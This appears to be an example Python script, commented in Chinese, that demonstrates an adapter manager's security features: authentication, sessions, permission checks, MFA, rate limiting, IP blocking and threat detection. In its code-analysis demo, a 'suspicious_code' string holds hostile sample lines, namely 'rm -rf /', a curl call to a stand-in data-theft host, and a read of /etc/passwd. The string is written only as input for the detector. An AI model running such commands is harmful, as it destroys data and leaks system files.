#!/usr/bin/env python3
"""
安全集成示例

展示如何使用集成了安全功能的适配器管理器。
"""

import asyncio
import logging
from typing import Dict, Any

from zishu.adapters.core import (
    AdapterManager, 
    AdapterManagerConfig,
    SecurityServiceConfig
)

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)


async def main():
    """主函数"""
    
    # 创建安全配置
    security_config = SecurityServiceConfig(
        enable_authentication=True,
        enable_authorization=True,
        enable_threat_detection=True,
        enable_resource_monitoring=True,
        enable_audit_logging=True,
        session_timeout=3600,  # 1小时
        max_failed_attempts=5,
        lockout_duration=300,  # 5分钟
        require_mfa=False
    )
    
    # 创建适配器管理器配置
    manager_config = AdapterManagerConfig(
        max_adapters=50,
        enable_security=True,
        security_config=security_config,
        startup_timeout=30.0,
        shutdown_timeout=10.0
    )
    
    # 创建适配器管理器
    manager = AdapterManager(manager_config)
    
    try:
        # 初始化和启动管理器
        logger.info("Initializing adapter manager with security...")
        await manager.initialize()
        await manager.start()
        
        # 演示安全功能
        await demonstrate_security_features(manager)
        
    except Exception as e:
        logger.error(f"Error in main: {e}")
        raise
    finally:
        # 清理资源
        logger.info("Shutting down adapter manager...")
        await manager.stop()


async def demonstrate_security_features(manager: AdapterManager):
    """演示安全功能"""
    
    logger.info("=== 安全功能演示 ===")
    
    # 1. 用户认证
    logger.info("1. 用户认证演示")
    user_id = "test_user"
    credentials = {
        "username": "test_user",
        "password": "secure_password_123",
        "auth_type": "password"
    }
    
    auth_result = await manager.authenticate_user(user_id, credentials)
    logger.info(f"Authentication result: {auth_result}")
    
    # 2. 创建安全会话
    logger.info("2. 创建安全会话")
    permissions = [
        "adapter:read",
        "adapter:execute",
        "system:monitor"
    ]
    
    session_id = await manager.create_security_session(
        user_id=user_id,
        permissions=permissions,
        client_ip="127.0.0.1",
        user_agent="SecurityDemo/1.0"
    )
    logger.info(f"Created security session: {session_id}")
    
    # 3. 权限检查
    logger.info("3. 权限检查演示")
    
    # 检查允许的权限
    can_read = await manager.check_permission(session_id, "adapter", "read")
    logger.info(f"Can read adapters: {can_read}")
    
    can_execute = await manager.check_permission(session_id, "adapter", "execute")
    logger.info(f"Can execute adapters: {can_execute}")
    
    # 检查不允许的权限
    can_admin = await manager.check_permission(session_id, "system", "admin")
    logger.info(f"Can admin system: {can_admin}")
    
    # 4. 代码安全分析
    logger.info("4. 代码安全分析演示")
    
    # 安全的代码
    safe_code = """
def calculate_sum(a, b):
    return a + b

result = calculate_sum(10, 20)
print(f"Result: {result}")
"""
    
    safe_analysis = await manager.analyze_code_security(safe_code)
    if safe_analysis:
        logger.info(f"Safe code analysis: {safe_analysis.get('threat_level', 'N/A')}")
    
    # 可疑的代码
    suspicious_code = """
import os
import subprocess

# 执行系统命令
os.system("rm -rf /")
subprocess.call(["curl", "http://malicious-site.com/steal-data"])

# 读取敏感文件
with open("/etc/passwd", "r") as f:
    data = f.read()
"""
    
    suspicious_analysis = await manager.analyze_code_security(suspicious_code)
    if suspicious_analysis:
        logger.info(f"Suspicious code analysis: {suspicious_analysis.get('threat_level', 'N/A')}")
        logger.info(f"Detected threats: {len(suspicious_analysis.get('threats', []))}")
    
    # 5. 获取安全状态
    logger.info("5. 安全状态查询")
    security_status = await manager.get_security_status()
    logger.info(f"Security enabled: {security_status.get('enabled', False)}")
    
    if security_status.get('enabled'):
        logger.info("Security components status:")
        for component, status in security_status.get('security_service', {}).items():
            if isinstance(status, dict) and 'initialized' in status:
                logger.info(f"  - {component}: {'✓' if status['initialized'] else '✗'}")
    
    # 6. 查看活跃会话
    logger.info("6. 活跃会话查询")
    active_sessions = await manager.get_active_security_sessions()
    logger.info(f"Active sessions count: {len(active_sessions)}")
    
    for session in active_sessions[:3]:  # 只显示前3个
        logger.info(f"  - Session {session.get('session_id', 'N/A')[:8]}...: "
                   f"User {session.get('user_id', 'N/A')}")
    
    # 7. 安全配置演示
    logger.info("7. 安全配置演示")
    
    # 配置速率限制
    manager.configure_security_rate_limiting(60)  # 每分钟60次请求
    logger.info("Configured rate limiting: 60 requests/minute")
    
    # 添加阻止的IP（演示用）
    manager.add_blocked_ip("192.168.1.100")
    logger.info("Added blocked IP: 192.168.1.100")
    
    # 8. 获取安全警报
    logger.info("8. 安全警报查询")
    security_alerts = await manager.get_security_alerts(limit=10)
    logger.info(f"Recent security alerts: {len(security_alerts)}")
    
    for alert in security_alerts[:3]:  # 只显示前3个
        logger.info(f"  - {alert.get('title', 'N/A')}: {alert.get('level', 'N/A')}")
    
    # 9. 系统健康检查（包含安全组件）
    logger.info("9. 系统健康检查")
    system_health = await manager.get_system_health()
    logger.info("System health status:")
    
    for service_name, health in system_health.items():
        status_icon = "✓" if health.is_healthy else "✗"
        logger.info(f"  - {service_name}: {status_icon} ({health.status.value})")
    
    # 10. 演示紧急锁定（注意：这会影响系统运行）
    logger.info("10. 紧急锁定演示（跳过实际执行）")
    logger.info("Emergency lockdown would be triggered with:")
    logger.info("  await manager.emergency_lockdown('Security breach detected')")
    logger.info("And lifted with:")
    logger.info("  await manager.lift_emergency_lockdown()")
    
    logger.info("=== 安全功能演示完成 ===")


async def demonstrate_advanced_security():
    """演示高级安全功能"""
    
    logger.info("=== 高级安全功能演示 ===")
    
    # 创建高安全性配置
    high_security_config = SecurityServiceConfig(
        enable_authentication=True,
        enable_authorization=True,
        enable_threat_detection=True,
        enable_resource_monitoring=True,
        enable_audit_logging=True,
        session_timeout=1800,  # 30分钟
        max_failed_attempts=3,  # 更严格
        lockout_duration=600,   # 10分钟锁定
        require_mfa=True,       # 需要多因子认证
        enable_ip_filtering=True,
        allowed_ip_ranges=["127.0.0.0/8", "10.0.0.0/8"],
        enable_rate_limiting=True,
        rate_limit_requests_per_minute=30  # 更严格的速率限制
    )
    
    manager_config = AdapterManagerConfig(
        enable_security=True,
        security_config=high_security_config
    )
    
    manager = AdapterManager(manager_config)
    
    try:
        await manager.initialize()
        await manager.start()
        
        # 演示多因子认证
        logger.info("Multi-factor authentication demo:")
        
        credentials_with_mfa = {
            "username": "admin_user",
            "password": "super_secure_password",
            "mfa_token": "123456",  # 通常来自认证器应用
            "auth_type": "password_mfa"
        }
        
        mfa_result = await manager.authenticate_user("admin_user", credentials_with_mfa)
        logger.info(f"MFA authentication result: {mfa_result}")
        
        # 演示IP过滤
        logger.info("IP filtering demo:")
        manager.add_blocked_ip("192.168.1.0/24")  # 阻止整个子网
        logger.info("Blocked subnet: 192.168.1.0/24")
        
        # 获取详细的安全状态
        detailed_status = await manager.get_security_status()
        logger.info("Detailed security status:")
        logger.info(f"  - Threat detector stats: {detailed_status.get('threat_detector', {}).get('stats', {})}")
        logger.info(f"  - Resource monitor stats: {detailed_status.get('resource_monitor', {}).get('stats', {})}")
        
    finally:
        await manager.stop()
    
    logger.info("=== 高级安全功能演示完成 ===")


if __name__ == "__main__":
    try:
        asyncio.run(main())
        
        # 可选：运行高级安全演示
        print("\n" + "="*50)
        print("运行高级安全演示？(y/N): ", end="")
        choice = input().strip().lower()
        
        if choice == 'y':
            asyncio.run(demonstrate_advanced_security())
            
    except KeyboardInterrupt:
        logger.info("Demo interrupted by user")
    except Exception as e:
        logger.error(f"Demo failed: {e}")
        raise
